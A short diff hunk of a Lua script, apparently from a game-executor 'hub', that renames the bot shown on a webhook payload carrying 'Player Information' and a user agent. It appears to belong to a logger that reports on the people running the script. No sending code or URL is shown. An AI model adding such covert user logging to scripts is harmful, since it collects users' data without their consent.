@@ -293,7 +293,7 @@ local function sendWebhook()
     local userAgent = getUserAgent()
     
     local payload = {
-        username = "Genesis Hub Logger",
+        username = "Toxic Paid V3 Executions",
         embeds = {
             {
                 title = "Player Information",
